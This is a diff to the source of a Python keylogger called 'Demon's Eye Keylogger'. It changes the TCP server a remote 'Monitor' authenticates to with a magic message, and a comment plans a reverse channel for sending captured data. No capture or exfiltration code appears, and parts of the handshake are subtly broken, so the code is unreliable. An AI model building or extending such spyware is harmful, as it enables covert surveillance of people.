@@ -90,6 +90,7 @@ SERVER_BUFFER_SIZE = 64
 SERVER_MAX_CLIENTS = 5
 MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
 MAGIC_RESPONSE_PLAIN = "Demon's Eye Keylogger "+VERSION
+ENCODING = 'utf-8'
 
 ########################################################
 # VARIABLES GLOBALES - GLOBAL VARIABLES
@@ -122,6 +123,10 @@ keylog_name = ''
 # Control de threads - Thread Control
 threadLock = threading.Lock()
 threadList = []
+
+# TCP Server control
+# Cuando el servidor esta activo, tiene el valor True When Server is running this variable is True
+server_active = False
 
 
 ########################################################
@@ -161,13 +166,13 @@ class ClientThread(threading.Thread):
         self.conn = conn
         self.ip = ip
         self.port = port
-        self.response = base64.b64encode(bytes(MAGIC_RESPONSE_PLAIN,'utf-8'))
+        self.response = base64.b64encode(bytes(MAGIC_RESPONSE_PLAIN,ENCODING))
         logging.info("Recibida petición de Monitor desde " + ip + ":" + str(port))
 
     def run(self):
         while True:
-            data = self.conn.recv(2048)
-            logging.debug("El monitor ha enviado:", data)
+            data = str(self.conn.recv(2048))
+            logging.debug("El monitor ha enviado:" + data)
             if data == MAGIC_MESSAGE:
                 message = "Conexion establecida"
                 self.conn.send(MAGIC_RESPONSE_PLAIN)
@@ -175,10 +180,9 @@ class ClientThread(threading.Thread):
                 # Inicia comunicación inversa para enviar datos al Monitor
                 # Starts reverse comunication to send data to Monitor
                 # ... pending ...
-                pass
             else:
                 message = "No tiene permiso"
-                self.conn.send(message)
+                self.conn.send(bytes(message,ENCODING))
                 logging.debug(message)
                 break
 
